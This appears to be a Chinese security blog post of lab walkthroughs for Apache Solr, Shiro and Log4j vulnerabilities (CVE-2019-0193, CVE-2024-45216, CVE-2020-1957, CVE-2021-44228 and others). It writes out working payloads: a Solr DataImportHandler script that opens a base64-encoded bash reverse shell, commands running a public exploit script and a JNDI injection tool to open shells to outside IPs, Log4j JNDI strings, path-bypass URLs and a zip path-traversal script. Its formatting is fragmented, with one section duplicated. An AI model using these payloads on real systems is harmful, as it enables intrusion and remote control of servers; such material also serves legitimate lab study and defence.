> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzk3NTIyOTA0OQ==&mid=2247485223&idx=1&sn=7cadef856d0360ed2983ea9bd473a955

#  Solrs搜索&Shrio鉴权&Log4j日志&CVE历史漏洞  
原创 朝阳  泷羽Sec-朝阳   2025-07-13 13:26  
  
# Solr：（Vulfocus复现）  
  
  
主要基于HTTP和Apache Lucenne实现的全文搜索服务器  
  
#  
Solr  
：  
(  
Vulfocus  
复现  
)  
  
主要基于HTTP和  
Apache  
Lucene  
实现的全文搜索服务器。  
  
历史漏洞：https  
://  
avd  
.  
aliyun  
.  
com  
/  
search  
?  
q  
=  
Solr  
  
黑盒特征：图标及端口  
8393  
## 1、远程命令执行漏洞（CVE-2019-0193）  
  
Apache  
Solr  
5.0.0  
版本至  
8.3.1  
  
https  
://  
github  
.  
com  
/  
jas502n  
/  
solr_rce  
  
D  
:  
\  
Python27  
\python  
.  
exe solr_rce  
.  
py http  
://  
123.58.236.76  
:  
50847  
 id  
  
这里使用kali进行RCE  
  
python2 solr_rce.py http  
://  
123.58.236.76  
:  
50847  
 id  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0uC0SYTQa8azKh0gBJYKMHibYOP9BoWouwa0h8uUj2uMMicIP2ibaCdTWItWQLotTEVAOPnBETHxlsA/640?wx_fmt=png&from=appmsg "")  
  
打开环境就是这样一个环境，然后该漏洞对Solr服务版本有要求  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0uC0SYTQa8azKh0gBJYKMH31upllzYcGib1tBUz2ntzrWuicUxJuLJ0fW6BspkZE3N9uanxM1bXbcQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0uC0SYTQa8azKh0gBJYKMHtp7SU7IgqhLa1icxrPJDt8ztnGqHw9q4MUE6Kc52ZVPtH6p7iaWsvxUQ/640?wx_fmt=png&from=appmsg "")  
  
执行成功，这里要注意一定要确保环境配置正确，并且使用python2环境去运行  
## 2、远程命令执行漏洞(CVE-2019-0193)  
  
Apache  
Solr  
<  
8.2.0  
版本  
  
https  
://  
vulhub  
.  
org  
/  
#  
/  
environments  
/  
solr  
/  
CVE  
-  
2019  
-  
0193  
/  
  
条件  
1  
：  
Apache  
Solr  
的  
DataImportHandler  
启用了模块  
DataImportHandler  
(  
默认不会被启用  
)  
  
条件  
2  
：  
SolrAdmin  
 UI未开启鉴权认证。（默认情况无需任何认证）  
  
选择已有核心后选择  
Dataimport  
功能并选择debug模式，更改填入以下POC，点击  
Execute  
withthis  
Confuguration  
  
POC：  
  
<dataConfig>  
  
<  
dataSource type  
=  
"URLDataSource"  
/>  
  
<script>  
<!  
[  
CDATA  
[  
  
function poc(){java.lang.Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEyOS82NjY2IDA+JjE=}|{base64,-d}|{bash,-i}");  
  
}  
  
]]  
></  
script  
>  
  
<document>  
  
<  
entity name  
=  
"stackoverflow"  
  
url  
=  
"https://stackoverflow.com/feeds/tag/solr"  
  
processor  
=  
"XPathEntityProcessor"  
  
forEach  
=  
"/feed"  
  
transformer  
=  
"script:poc"  
/>  
  
</  
document  
>  
  
</dataConfig>  
  
这里我们要注意关键命令在于这段代码，base64解密一下  
  
YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ==  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0uC0SYTQa8azKh0gBJYKMHIqGU4E42hlXxZlxGPpF5tDykLvpiaoxvMice9mYMBVzt5t8YSicPvxfFA/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0uC0SYTQa8azKh0gBJYKMHDUUD0mmOh5R1ljiaHYicZcH487xzCrPLxlygjBDlbu1IicHL5lvHcghiag/640?wx_fmt=png&from=appmsg "")  
  
因此我们构造一下这个反弹shell的ip端口即可  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0uC0SYTQa8azKh0gBJYKMHN2ObL22ZnKTleYBPFtDWnibbeSrTOqNW52eZOMgian1DUDsAVALu907w/640?wx_fmt=png&from=appmsg "")  
  
然后点击下面的执行蓝框即可  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0uC0SYTQa8azKh0gBJYKMH5e8bL2nzUucH5iaianc1vVxZvW7aBFpEBvWkpOOhOKpYjNOMJW2uibVicA/640?wx_fmt=png&from=appmsg "")  
## 3、认证绕过漏洞（CVE-2024-45216）  
  
参考：https  
://  
mp  
.  
weixin  
.  
qq  
.  
com  
/  
s  
/  
Ke3hzJ2iGSekrsFpZV263w  
  
关键点：GET   
/  
solr  
/  
admin  
/  
info  
/  
properties  
:/  
admin  
/  
info  
/  
key  
  
漏洞版本：  
  
  
5.3.0 <= Apache Solr < 8.11.4  
  
    9.0.0 <= Apache Solr < 9.7.0  
  
资产测绘：  
  
app=  
"APACHE-Solr"  
  
POC：  

```
GET /solr/admin/info/properties:/admin/info/key 
HTTP/1.1Host: XXXX
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0uC0SYTQa8azKh0gBJYKMHGIzcd00rd77ib4AyKwFLm1icfMwt90tRjbKmfgJMocicMSuic8Kek7gTWw/640?wx_fmt=png&from=appmsg "")  
## 4.文件上传路径遍历漏洞（CVE-2024-52012）  
  
参考：https  
://  
mp  
.  
weixin  
.  
qq  
.  
com  
/  
s  
/  
uYGLIcu0VUA3sB6heBUBrg  
  
#  
Shiro  
：  
(  
本地源码复现  
)  
  
Java  
安全框架，能够用于身份验证、授权、加密和会话管理。  
  
历史漏洞：https  
://  
avd  
.  
aliyun  
.  
com  
/  
search  
?  
q  
=  
Shiro  
  
黑盒特征：数据包cookie里面rememberMe  
  
范围：  
6.6 - 9.7.0  
  
POC:  

```
import zipfile

# 创建ZIP文件并添加文件
with zipfile.ZipFile('0.zip', 'w') as zipf:
    zipf.writestr(&#34;0.txt&#34;, &#34;hello world, 0&#34;)
    zipf.writestr(&#34;../a.txt&#34;,&#34;hello world&#34;)
    zipf.writestr(&#34;../a.class.&#34;,&#34;class test&#34;)
```

# Shiro：(本地源码复现)  
  
Java  
安全框架，能够用于身份验证、授权、加密和会话管理。鉴权用的。  
  
历史漏洞：https  
://  
avd  
.  
aliyun  
.  
com  
/  
search  
?  
q  
=  
Shiro  
  
黑盒特征：数据包cookie里面rememberMe  
## 1、CVE_2016_4437 Shiro-550+Shiro-721  
  
影响范围：  
Apache  
Shiro  
<=  
1.2.4  
  
工具箱利用项目搜哈  
  
这里如果我们登录返回admin page，登陆失败返回please login！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0uC0SYTQa8azKh0gBJYKMHSUxssgCtwyK1eQRcxD5YHpC7ticvdzn3szGFojsKjJKicNic3D0qCYaZA/640?wx_fmt=png&from=appmsg "")  
  
这里无论怎么访问都是这个页面  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0uC0SYTQa8azKh0gBJYKMHfqwWg9Kdjon4rlq5rEvJTqWKkYtkyXTYze2tSRrpwxcSJwcscMFklw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0uC0SYTQa8azKh0gBJYKMHeAGWjQGiaP2wf5eeM4vucHiack8Q6hRGwTvODfO9Sea3Jx9d1G9IIjfA/640?wx_fmt=png&from=appmsg "")  
  
这里后面加上%20即可绕过  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0uC0SYTQa8azKh0gBJYKMHzBgnCf1WM6AGxGaelicV7omziaViaicEbCBtTtcSGwpXyoFeN2JfH5icuXw/640?wx_fmt=png&from=appmsg "")  
## 2、CVE-2020-11989  
  
Poc  
：  
/  
admin  
/%  
20  
  
影响范围：  
ApacheShiro  
<  
1.7.1  
## 3、CVE-2020-1957  
  
Poc  
：  
/  
xxx  
/  
..;  
/  
admin  
/  
  
影响范围：  
ApacheShiro  
<  
1.5.3  
## 4、Shiro-721RCE  
  
shiro-721 代码执行  
### 漏洞特征  
  
漏洞利用原理，反序列化的aes密钥key   
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0uC0SYTQa8azKh0gBJYKMHtyTHC20vyLZxykZGw0WwNGQoG7iaCDqH1OicK2MjeWP27mqdG1AAQfZw/640?wx_fmt=png&from=appmsg "")  
  
请求包发送后响应包带有rememberMe字样  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0uC0SYTQa8azKh0gBJYKMHkF78yvy2Au2fClic4Oac3E5nD6vWwgVzqaXOFt1wR5yyUvUlhA0cb5g/640?wx_fmt=png&from=appmsg "")  
  
返回包时也会带有rememberMe字样  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0uC0SYTQa8azKh0gBJYKMH2hYfv6dl8ZE4Ic4fnWNdqzTrEUPafYmr3KwA2PFribWBPcFfD38t4Hw/640?wx_fmt=png&from=appmsg "")  
### 漏洞利用  
  
这里我们登陆成功后会带有我们的密钥key，使用工具检测一下，然后就能构造人命令了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0uC0SYTQa8azKh0gBJYKMHI6SDRDicVO0BkG9icgIcJuPs3SBvk8gFoNnmwduqJ8W4keRywYTRP2Wg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0uC0SYTQa8azKh0gBJYKMHxiaNBvH6o8aiafW1HydgYYU3cnwc20hE3eamyjcNHc2ZxroF9ichAU9Yw/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0uC0SYTQa8azKh0gBJYKMHPPiapL7QEJIlfqLZU1wmXKaQUgeibf6tLymYC5yYc1bzOEfawvnd0n5Q/640?wx_fmt=png&from=appmsg "")  
  
然后使用命令执行功能即可  
# Log4j：(Vulhub和本地源码复现)  
  
Apache  
的一个开源项目，是一个基于  
Java  
的日志记录框架。  
  
历史漏洞：https  
://  
avd  
.  
aliyun  
.  
com  
/  
search  
?  
q  
=  
Log4j  
  
黑盒特征：  
  
红队盲打，将payload插入到任何地方   
  
会问蓝队攻击特征（$  
{  
jndi  
:  
rmi  
:/  
//osutj8}）  
## 1、Log4j2远程命令执行（CVE-2021-44228）  
  
漏洞影响的产品版本包括：  
  
Apache  
Log4j2  
2.0  
-  
2.15.0  
-  
rc1  
  
1  
、生成反弹  
Shell  
的JNDI注入  
  
jjava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjE1Mi85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}" -A 192.168.66.152  
  
工具构造Paload  
  
2、POC  
  
http://192.168.66.152:8983/solr/admin/cores?action=${jndi:rmi://192.168.66.152:1099/i9gdvn}  
  
这里使用log4j加密工具  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0uC0SYTQa8azKh0gBJYKMHaHF5vLMou1qpGnamGxCQX0F3JLhdUKicxel4vKHiciaC1efRsBTbbGs4A/640?wx_fmt=png&from=appmsg "")  
  
${jdni:ldap://127.0.0.1:50389/50470e}}  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0uC0SYTQa8azKh0gBJYKMHwibCvgBuEBVNWzeZyM0fHakeFZBPye6HGXBdd1fT12LuMxBp6dxwgCA/640?wx_fmt=png&from=appmsg "")  
  
这里vulhub启动一个log4j的漏洞  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0uC0SYTQa8azKh0gBJYKMHHbHWHjkxXGicqznpSeMiaEdPCOltQDiaZMkdU868QVLpDB4EgJ0Rh4JIg/640?wx_fmt=png&from=appmsg "")  
  
这里进行一个base64的编码，因为要做jndi注入  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0uC0SYTQa8azKh0gBJYKMHoTfBgMs2Z81UNbibxZYCwRCUDO9zAFZ9FVvA7zdXKPS2BzcM2jmlQdA/640?wx_fmt=png&from=appmsg "")  
  
      
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0uC0SYTQa8azKh0gBJYKMH9UXk8uyrzWsrbYicb4pwXE0krlKiaIUncW29fpoQpIA2ibPjOribNmK9QA/640?wx_fmt=png&from=appmsg "")  
  
这里就生成了jndi的恶意注入  

```
http://ip:8983/solr/admin/cores?action=${jndi:rmi://172.18.0.1:1099/vfchso}
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT0uC0SYTQa8azKh0gBJYKMHxVxNxt4rVbNKKB3gQeEdQIqXUicquL9exdggZyZz7zN97TR10CPIUTA/640?wx_fmt=png&from=appmsg "")  
  
这里就监听到了  
  
这里一定注意，jndi注入需要jdk低版本，高版本不适应，需要去学习高版绕过  
  
jdk版本过高、没有漏洞会、不出网造成无法注入  
  
2  
、构造JNDI注入  
Payload  
提交  
  
$  
{  
jndi  
:  
rmi  
://  
47.94.236.117  
:  
1099  
/  
osutj8  
}  
  
%  
24  
%  
7  
b  
%  
6  
a  
%  
6  
e  
%  
64  
%  
69  
%  
3  
a  
%  
72  
%  
6d  
%  
69  
%  
3  
a  
%  
2f  
%  
2f  
%  
34  
%  
37  
%  
2  
e  
%  
39  
%  
34  
%  
2  
e  
%  
32  
%  
33  
%  
36  
%  
2  
e  
%  
31  
%  
31  
%  
37  
%  
3  
a  
%  
31  
%  
30  
%  
39  
%  
39  
%  
2f  
%  
6f  
%  
73  
%  
75  
%  
74  
%  
6  
a  
%  
38  
%  
7d  
  
  
